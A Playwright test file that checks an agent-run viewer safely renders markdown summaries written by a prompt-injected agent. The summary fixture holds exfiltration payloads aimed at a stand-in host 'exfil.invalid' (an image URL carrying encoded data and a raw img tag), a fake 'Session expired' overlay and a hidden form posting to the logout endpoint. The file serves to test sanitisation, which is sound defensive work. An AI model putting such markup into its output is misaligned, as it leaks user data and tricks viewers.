import { expect, test } from '@playwright/test';
import authUtil from '../utils/auth.util';
import { cleanupBackend } from '../utils/cleanup.util';
import runUtil from '../utils/run.util';

// Runs use real sandboxes, so these specs get more time than the suite default
test.describe.configure({ timeout: 60_000 });

test.beforeEach(async ({ page }) => {
	await cleanupBackend(page.request);
	await authUtil.authenticate(page);
});

test('Markup in a run summary cannot load remote content, draw overlays or submit forms', async ({
	page
}) => {
	// A prompt-injected agent controls its summary, which the viewer's browser renders as markdown
	const job = await runUtil.createJob(page.request, 'Markdown job');
	const summary = [
		'**Done.**',
		'',
		'![chart](http://exfil.invalid/leak?d=c2VjcmV0)',
		'',
		'<img src="http://exfil.invalid/raw">',
		'',
		'<div data-testid="overlay" class="fixed inset-0" style="position:fixed;inset:0">Session expired</div>',
		'',
		'<form data-testid="form" method="post" action="/api/auth/logout"><input name="p"><button>Sign in</button></form>'
	].join('\n');
	const { runId, status } = await runUtil.runScripted(page.request, job.id, [
		{ toolCalls: [{ name: 'finish', args: { status: 'success', summary } }] }
	]);
	expect(status).toBe('succeeded');

	const remote: string[] = [];
	page.on('request', (request) => {
		if (request.url().includes('exfil.invalid')) remote.push(request.url());
	});
	await page.goto(`/runs/${runId}`);
	await page.getByRole('tab', { name: 'Outputs' }).click();

	// Formatting survives, and the markdown image becomes a link the viewer has to choose to open
	const markdown = page.locator('[data-slot="markdown"]').first();
	await expect(markdown.locator('strong')).toHaveText('Done.');
	await expect(markdown.getByRole('link', { name: 'chart' })).toHaveAttribute(
		'href',
		'http://exfil.invalid/leak?d=c2VjcmV0'
	);

	// Nothing that fetches, overlays or submits makes it into the page
	await expect(markdown.locator('img, form, input, button, [style], [class]')).toHaveCount(0);
	await expect(markdown).toContainText('Session expired');
	expect(remote).toEqual([]);
});
